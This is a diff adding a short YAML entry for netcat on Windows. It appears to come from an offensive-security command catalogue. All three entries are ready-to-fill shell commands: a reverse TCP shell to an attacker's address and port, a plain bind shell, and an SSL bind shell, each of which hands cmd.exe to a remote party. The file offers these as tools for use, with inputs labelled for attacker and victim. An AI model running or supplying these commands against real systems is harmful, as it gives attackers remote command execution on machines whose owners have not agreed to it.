@@ -1,0 +1,29 @@
+---
+name: netcat
+description: Arbitrary TCP and UDP connections and listeners
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Reverse TCP Shell (-e option)":
+    - type: ["other","NX"]
+    - text: "nc.exe {IPV4} {INT} -e cmd.exe"
+    - input: ["attacker IPv4 address","attacker listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Bind TCP Shell":
+    - type: ["other","NX"]
+    - text: "nc.exe -l -p {INT} -e cmd.exe"
+    - input: ["victim listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Bind TCP Shell (with SSL)":
+    - type: ["other","NX"]
+    - text: "nc.exe -l --ssl -p {INT} -e cmd.exe"
+    - input: ["victim listening TCP port"]
+    - output: null
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+...
